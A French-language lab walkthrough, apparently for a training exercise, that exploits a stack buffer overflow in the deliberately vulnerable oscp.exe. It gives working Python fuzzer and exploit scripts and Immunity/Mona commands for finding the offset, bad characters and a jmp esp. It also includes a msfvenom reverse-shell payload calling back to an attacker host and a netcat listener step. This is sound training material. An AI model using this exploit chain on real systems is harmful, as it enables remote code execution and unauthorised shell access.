Cliquez avec le bouton droit sur l'icône Immunity Debugger sur le bureau et choisissez "Exécuter en tant qu'administrateur".

Lorsque Immunité se charge, cliquez sur l'icône d'ouverture de fichier ou choisissez Fichier -> Ouvrir. Accédez au dossier des applications vulnérables sur le bureau de l'utilisateur administrateur, puis au dossier "oscp". Sélectionnez le binaire "oscp" (oscp.exe) et cliquez sur "Ouvrir".

Le binaire s'ouvrira dans un état "en pause", alors cliquez sur l'icône de lecture rouge ou choisissez Déboguer -> Exécuter. Dans une fenêtre de terminal, le binaire oscp.exe devrait être en cours d'exécution et nous indique qu'il écoute sur le port 1337.

Sur votre box Kali, connectez-vous au port 1337 sur MACHINE_IP en utilisant netcat :

nc MACHINE_IP 1337

Tapez "AIDE" et appuyez sur Entrée. Notez qu'il existe 10 commandes OVERFLOW différentes numérotées de 1 à 10. Tapez « OVERFLOW1 test » et appuyez sur Entrée. La réponse doit être "OVERFLOW1 COMPLETE". Terminez la connexion.

Configuration Mona

Le script mona a été préinstallé, mais pour faciliter son utilisation, vous devez configurer un dossier de travail à l'aide de la commande suivante, que vous pouvez exécuter dans la zone de saisie de commande en bas de la fenêtre Immunity Debugger :

```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

Créez un fichier sur votre box Kali nommé fuzzer.py avec le contenu suivant :

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Exécutez le script fuzzer.py en utilisant python :python3 fuzzer.py

Le fuzzer enverra des chaînes de plus en plus longues composées d'As. Si le fuzzer plante le serveur avec l'une des chaînes, le fuzzer devrait se terminer avec un message d'erreur. Notez le plus grand nombre d'octets envoyés.

## Réplication des plantages et contrôle de l'EIP

﻿Créez un autre fichier sur votre boitier Kali nommé exploit.py avec le contenu suivant :

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Exécutez la commande suivante pour générer un modèle cyclique d'une longueur supérieure de 400 octets à la chaîne qui a planté le serveur (modifiez la valeur -l par celle-ci) :

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`

Copiez la sortie et placez-la dans la variable de charge utile du script exploit.py.

Sous Windows, dans Immunity Debugger, rouvrez à nouveau oscp.exe en utilisant la même méthode qu'auparavant, puis cliquez sur l'icône de lecture rouge pour le faire fonctionner. Vous devrez le faire avant chaque fois que nous exécuterons exploit.py (que nous exécuterons plusieurs fois avec des modifications incrémentielles).

Sur Kali, exécutez le script exploit.py modifié :`python3 exploit.py`

Le script devrait à nouveau planter le serveur oscp.exe. Cette fois, dans Immunity Debugger, dans la zone de saisie de commande en bas de l'écran, exécutez la commande mona suivante, en modifiant la distance pour qu'elle soit de la même longueur que le motif que vous avez créé :

`!mona findmsp -distance 600`

Mona devrait afficher une fenêtre de journal avec le résultat de la commande. Sinon, cliquez sur le menu "Fenêtre" puis sur "Données du journal" pour les visualiser (choisissez "CPU" pour revenir à la vue standard).

Dans cette sortie, vous devriez voir une ligne indiquant :

`EIP contains normal pattern : ... (offset XXXX)`

Mettez à jour votre script exploit.py et définissez la variable offset sur cette valeur (auparavant définie sur 0). Définissez à nouveau la variable de charge utile sur une chaîne vide. Définissez la variable retn sur "BBBB".

Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Le registre EIP doit maintenant être remplacé par les 4 B (par exemple 42424242).

Trouver de mauvais personnages

﻿Générez un tableau d'octets en utilisant mona et excluez l'octet nul (\x00) par défaut. Notez l'emplacement du fichier bytearray.bin généré (si le dossier de travail a été défini conformément à la section Configuration Mona de ce guide, l'emplacement doit être C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"\
`

Générez maintenant une chaîne de mauvais caractères identique au bytearray. Le script Python suivant peut être utilisé pour générer une chaîne de mauvais caractères de \x01 à \xff :

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Mettez à jour votre script exploit.py et définissez la variable de charge utile sur la chaîne de mauvais caractères générés par le script.

Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Notez l'adresse vers laquelle pointe le registre ESP et utilisez-la dans la commande mona suivante :

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

Une fenêtre contextuelle devrait apparaître intitulée « Résultats de la comparaison de la mémoire mona ». Sinon, utilisez le menu Fenêtre pour y accéder. La fenêtre affiche les résultats de la comparaison, indiquant tous les caractères différents en mémoire de ceux du fichier bytearray.bin généré.

Tous ces éléments ne sont peut-être pas des méchants ! Parfois, les badchars entraînent également la corruption de l'octet suivant, voire affectent le reste de la chaîne.

Le premier badchar de la liste doit être l'octet nul (\x00) puisque nous l'avons déjà supprimé du fichier. Notez tous les autres. Générez un nouveau bytearray dans mona, en spécifiant ces nouveaux badchars avec \x00. Mettez ensuite à jour la variable de charge utile dans votre script exploit.py et supprimez également les nouveaux badchars.

Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Répétez la comparaison badchar jusqu'à ce que l'état des résultats renvoie « Non modifié ». Cela indique qu'il n'existe plus de badchars.

Trouver un point de saut

Avec oscp.exe en cours d'exécution ou en panne, exécutez la commande mona suivante, en veillant à mettre à jour l'option -cpb avec tous les badchars que vous avez identifiés (y compris \x00) :

`!mona jmp -r esp -cpb "\x00"`

Cette commande trouve toutes les instructions "jmp esp" (ou équivalent) dont les adresses ne contiennent aucun des badchars spécifiés. Les résultats doivent s'afficher dans la fenêtre « Données du journal » (utilisez le menu Fenêtre pour y accéder si nécessaire).

Choisissez une adresse et mettez à jour votre script exploit.py, en définissant la variable "retn" sur l'adresse, écrite à l'envers (puisque le système est little endian). Par exemple, si l'adresse est \x01\x02\x03\x04 dans Immunité, écrivez-la comme \x04\x03\x02\x01 dans votre exploit.

Générer une charge utile

Exécutez la commande msfvenom suivante sur Kali, en utilisant votre IP VPN Kali comme LHOST et en mettant à jour l'option -b avec tous les badchars que vous avez identifiés (y compris \x00) :

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c\
`

Copiez les chaînes de code C générées et intégrez-les dans la variable de charge utile de votre script exploit.py en utilisant la notation suivante :

```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"\
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"\
...\
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"\
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

## Ajouter des NOP au début

Puisqu'un encodeur a probablement été utilisé pour générer la charge utile, vous aurez besoin d'un peu d'espace en mémoire pour que la charge utile se décompresse. Vous pouvez le faire en définissant la variable de remplissage sur une chaîne de 16 octets ou plus « Aucune opération » (\x90) :

```
padding = "\x90" * 16
```

Exploiter!

Avec le préfixe, le décalage, l'adresse de retour, le remplissage et la charge utile corrects, vous pouvez désormais exploiter le débordement de tampon pour obtenir un shell inversé.

Démarrez un écouteur netcat sur votre box Kali en utilisant le LPORT que vous avez spécifié dans la commande msfvenom (4444 si vous ne l'avez pas modifié).

Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Votre écouteur netcat devrait attraper un shell inversé !
